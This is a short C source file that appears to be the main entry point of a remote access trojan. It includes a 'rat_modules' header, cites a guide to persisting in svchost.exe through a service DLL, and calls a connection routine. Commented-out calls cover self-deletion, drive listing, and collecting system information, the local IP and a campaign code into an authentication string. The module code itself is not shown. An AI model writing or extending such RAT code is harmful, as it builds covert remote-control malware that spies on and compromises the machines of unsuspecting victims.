#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <string.h>
#include "rat_modules.h"
#include <tchar.h>
#define BUFFER_SIZE 2048

int main(void) {

	/*
	* write dll service for svchost.exe
	* https://www.ired.team/offensive-security/persistence/persisting-in-svchost.exe-with-a-service-dll-servicemain
	*/

	InitConn();
	//SelfDelete();
	//GetFileDate("C:\\Users\\ameru\\Downloads\\heartbeat_APT_thumbnail_2.jpg");
	//ListDrives();
	
	//TESTING AUTH DATA
	/*
	char auth_data[BUFFER_SIZE] = { 0 };
	SysInfo(&auth_data, sizeof(auth_data));
	GetLocalIP(&auth_data, sizeof(auth_data));
	GetCampaginCode(&auth_data, sizeof(auth_data));
	strcat_s(auth_data, sizeof(auth_data), "qawsed");
	printf("auth_data is \n%s\n", auth_data);
	*/
	return 0;
}